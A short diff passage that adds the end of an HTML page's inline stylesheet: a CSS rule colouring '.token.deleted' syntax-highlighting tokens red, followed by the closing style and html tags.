+		}
+
+		.token.deleted {
+			background: #fb4934; /* red2 */
+		}
+	</style>
+</html>
